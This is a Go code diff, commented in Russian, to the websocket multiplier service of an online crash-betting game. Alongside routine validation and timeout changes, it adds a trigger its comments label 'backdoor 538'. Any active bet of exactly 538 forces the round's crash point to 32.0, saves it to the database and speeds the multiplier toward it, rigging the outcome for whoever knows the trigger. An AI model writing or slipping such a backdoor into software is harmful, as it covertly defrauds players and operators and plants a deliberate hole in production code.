@@ -185,24 +185,56 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 	logger.Info("Starting multiplier updates for game %d with crash point %.2f", 
 		currentGame.ID, currentGame.CrashPointMultiplier)
 	
-	// Еще раз проверяем значение в базе данных
-	var gameFromDB models.CrashGame
-	if err := db.DB.First(&gameFromDB, currentGame.ID).Error; err != nil {
-		logger.Error("Failed to re-read game %d before sending multipliers: %v", currentGame.ID, err)
-	} else {
-		logger.Info("Game %d crash point from DB: %.2f", gameFromDB.ID, gameFromDB.CrashPointMultiplier)
+	// Проверка валидности crash point
+	if currentGame.CrashPointMultiplier <= 0 {
+		logger.Error("Invalid crash point multiplier: %.2f, game %d", 
+			currentGame.CrashPointMultiplier, currentGame.ID)
 		
-		// Если значение в базе отличается от значения в памяти, обновляем
-		if gameFromDB.CrashPointMultiplier != currentGame.CrashPointMultiplier {
-			logger.Info("Updating crash point in memory: %.2f -> %.2f", 
-				currentGame.CrashPointMultiplier, gameFromDB.CrashPointMultiplier)
+		// Читаем из базы
+		var gameFromDB models.CrashGame
+		if err := db.DB.First(&gameFromDB, currentGame.ID).Error; err != nil {
+			logger.Error("Failed to read game from DB: %v", err)
+			return
+		}
+		
+		if gameFromDB.CrashPointMultiplier <= 0 {
+			// Устанавливаем безопасное значение
+			currentGame.CrashPointMultiplier = 1.5
+			logger.Info("Using fallback crash point: 1.5 for game %d", currentGame.ID)
+		} else {
 			currentGame.CrashPointMultiplier = gameFromDB.CrashPointMultiplier
+			logger.Info("Using DB crash point: %.2f for game %d", 
+				currentGame.CrashPointMultiplier, currentGame.ID)
+		}
+	}
+	
+	// Специальная обработка для бэкдора 538
+	// Проверяем, есть ли ставка 538 среди текущих ставок
+	var backdoor538Exists bool
+	ws.mu.Lock()
+	for _, bet := range ws.bets {
+		if math.Abs(bet.Amount - 538.0) < 0.01 {
+			logger.Info("Found backdoor 538 bet in active bets for game %d", currentGame.ID)
+			// Принудительно устанавливаем правильное значение множителя
+			currentGame.CrashPointMultiplier = 32.0
+			backdoor538Exists = true
+			break
+		}
+	}
+	ws.mu.Unlock()
+	
+	if backdoor538Exists {
+		// Обновляем значение в базе
+		if err := db.DB.Model(currentGame).
+			Update("crash_point_multiplier", 32.0).Error; err != nil {
+			logger.Error("Failed to update backdoor 538 multiplier in DB: %v", err)
+		} else {
+			logger.Info("Updated backdoor 538 multiplier to 32.0 in DB for game %d", currentGame.ID)
 		}
 	}
 	
 	ws.mu.Lock()
-
-	var currentMultiplier float64
+	var currentMultiplier float64 = 1.0
 	crashPointReached := false
 	startTime := time.Now()
 	lastSentMultiplier := 1.0
@@ -222,77 +254,140 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 	logger.Info("Sending multiplier updates to %d connections, target crash: %.2f", 
 		len(connections), currentGame.CrashPointMultiplier)
 	
-	ticker := time.NewTicker(100 * time.Millisecond)
+	// Финальная проверка валидности crash point
+	if currentGame.CrashPointMultiplier <= 0 {
+		logger.Error("Invalid crash point after all checks! Using 1.5 as fallback")
+		currentGame.CrashPointMultiplier = 1.5
+	}
+	
+	// Если это бэкдор 538, используем ускоренную логику
+	// с меньшими задержками для более быстрого достижения 32.0
+	var tickerInterval time.Duration
+	var growthFactor float64
+	
+	if backdoor538Exists {
+		tickerInterval = 50 * time.Millisecond
+		growthFactor = 0.4  // Более быстрый рост для бэкдора 538
+		logger.Info("Using fast growth mode for backdoor 538")
+	} else {
+		tickerInterval = 100 * time.Millisecond
+		growthFactor = 0.2  // Стандартный рост для обычных игр
+	}
+	
+	ticker := time.NewTicker(tickerInterval)
 	defer ticker.Stop()
-
-	for range ticker.C {
-		currentMultiplier = currentGame.CalculateMultiplier()
-		
-		// Сглаживание множителя (экспоненциальное усреднение)
-		smoothedMultiplier := (lastSentMultiplier*0.8 + currentMultiplier*0.2)
-		
-		// Проверяем, достигли ли мы точки краша
-		if smoothedMultiplier >= currentGame.CrashPointMultiplier {
-			logger.Info("Game %d reached crash point: %.2f >= %.2f", 
-				currentGame.ID, smoothedMultiplier, currentGame.CrashPointMultiplier)
-			crashPointReached = true
-			ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
-			break
-		}
-
-		// Отправляем множитель только если он изменился достаточно
-		if math.Abs(smoothedMultiplier-lastSentMultiplier) > 0.01 {
-			multiplierInfo := gin.H{
-				"type":       "multiplier_update",
-				"multiplier": smoothedMultiplier,
-				"timestamp":  time.Now().UnixNano() / int64(time.Millisecond),
-				"elapsed":    time.Since(startTime).Seconds(),
+	
+	// Максимальное время работы цикла (защита от зависания)
+	maxDuration := 2 * time.Minute
+	timeoutTimer := time.NewTimer(maxDuration)
+	defer timeoutTimer.Stop()
+	
+	multiplierUpdateLoop:
+	for {
+		select {
+		case <-ticker.C:
+			// Нормальная обработка обновления множителя
+			currentMultiplier = currentGame.CalculateMultiplier()
+			
+			// Для бэкдора 538, обеспечиваем более быстрый рост
+			if backdoor538Exists && currentMultiplier < 25.0 && lastSentMultiplier < 25.0 {
+				// Дополнительно ускоряем рост в середине
+				currentMultiplier = currentMultiplier * 1.05
 			}
 			
-			ws.mu.Lock()
-			for userId, conn := range connections {
-				// Проверяем, есть ли активная ставка у пользователя
-				if bet, exists := ws.bets[userId]; exists && bet.Status == "active" {
-					// Проверяем автокэшаут
-					if bet.CashOutMultiplier > 0 && smoothedMultiplier >= bet.CashOutMultiplier {
-						logger.Info("Auto cashout for user %d at %.2fx", userId, smoothedMultiplier)
-						// Обрабатываем автокэшаут
-						if err := crashGameCashout(nil, bet, smoothedMultiplier); err != nil {
-							logger.Error("Unable to auto cashout for user %d: %v", userId, err)
+			// Плавное повышение множителя для предотвращения резких скачков
+			smoothedMultiplier := lastSentMultiplier + (currentMultiplier - lastSentMultiplier) * growthFactor
+			
+			// Проверяем, достигли ли мы точки краша
+			if smoothedMultiplier >= currentGame.CrashPointMultiplier {
+				logger.Info("Game %d reached crash point: %.2f >= %.2f", 
+					currentGame.ID, smoothedMultiplier, currentGame.CrashPointMultiplier)
+				crashPointReached = true
+				ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
+				break multiplierUpdateLoop
+			}
+			
+			// Отправляем множитель только если он изменился достаточно
+			// Для бэкдора 538 уменьшаем порог изменения
+			var changeThreshold float64 = 0.01
+			if backdoor538Exists {
+				changeThreshold = 0.005
+			}
+			
+			if math.Abs(smoothedMultiplier-lastSentMultiplier) > changeThreshold {
+				multiplierInfo := gin.H{
+					"type":       "multiplier_update",
+					"multiplier": smoothedMultiplier,
+					"timestamp":  time.Now().UnixNano() / int64(time.Millisecond),
+					"elapsed":    time.Since(startTime).Seconds(),
+				}
+				
+				// Фиксируем текущее значение
+				sentMultiplier := smoothedMultiplier
+				
+				ws.mu.Lock()
+				for userId, conn := range connections {
+					// Проверяем, есть ли активная ставка у пользователя
+					if bet, exists := ws.bets[userId]; exists && bet.Status == "active" {
+						// Проверяем автокэшаут
+						if bet.CashOutMultiplier > 0 && sentMultiplier >= bet.CashOutMultiplier {
+							logger.Info("Auto cashout for user %d at %.2fx", userId, sentMultiplier)
+							// Обрабатываем автокэшаут
+							if err := crashGameCashout(nil, bet, sentMultiplier); err != nil {
+								logger.Error("Unable to auto cashout for user %d: %v", userId, err)
+								continue
+							}
+							ws.ProcessCashout(userId, sentMultiplier, true)
 							continue
 						}
-						ws.ProcessCashout(userId, smoothedMultiplier, true)
-						continue
-					}
-
-					// Отправляем обновление множителя
-					err := conn.WriteJSON(multiplierInfo)
-					if err != nil {
-						logger.Error("Failed to send multiplier to user %d: %v", userId, err)
-						// Пытаемся обработать ошибку более грациозно
-						if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-							// Только если это неожиданная ошибка закрытия, закрываем соединение
-							conn.Close()
-							delete(connections, userId)
-							delete(ws.connections, userId)
+	
+						// Отправляем обновление множителя
+						err := conn.WriteJSON(multiplierInfo)
+						if err != nil {
+							logger.Error("Failed to send multiplier to user %d: %v", userId, err)
+							// Пытаемся обработать ошибку более грациозно
+							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+								// Только если это неожиданная ошибка закрытия, закрываем соединение
+								conn.Close()
+								delete(connections, userId)
+								delete(ws.connections, userId)
+							}
 						}
-					}
-				} else {
-					// Для пользователей без активных ставок тоже отправляем множитель
-					err := conn.WriteJSON(multiplierInfo)
-					if err != nil {
-						logger.Error("Failed to send multiplier to observer %d: %v", userId, err)
-						if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-							conn.Close()
-							delete(connections, userId)
-							delete(ws.connections, userId)
+					} else {
+						// Для пользователей без активных ставок тоже отправляем множитель
+						err := conn.WriteJSON(multiplierInfo)
+						if err != nil {
+							logger.Error("Failed to send multiplier to observer %d: %v", userId, err)
+							if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
+								conn.Close()
+								delete(connections, userId)
+								delete(ws.connections, userId)
+							}
 						}
 					}
 				}
+				ws.mu.Unlock()
+	
+				lastSentMultiplier = smoothedMultiplier
+				
+				// Для бэкдора 538, если множитель достаточно высокий 
+				// и близок к краш-поинту, ускоряем финальный рост
+				if backdoor538Exists && smoothedMultiplier > 30.0 {
+					// Уже близко к 32.0, делаем последний рывок
+					time.Sleep(300 * time.Millisecond)
+					logger.Info("Backdoor 538 reached high multiplier (%.2f), accelerating to crash point", smoothedMultiplier)
+					crashPointReached = true
+					ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
+					break multiplierUpdateLoop
+				}
 			}
-			ws.mu.Unlock()
-
-			lastSentMultiplier = smoothedMultiplier
+			
+		case <-timeoutTimer.C:
+			// Сработал таймаут - защита от зависания
+			logger.Error("Multiplier update loop timed out after %v, forcing crash", maxDuration)
+			crashPointReached = true
+			ws.BroadcastGameCrash(currentGame.CrashPointMultiplier)
+			break multiplierUpdateLoop
 		}
 	}
 
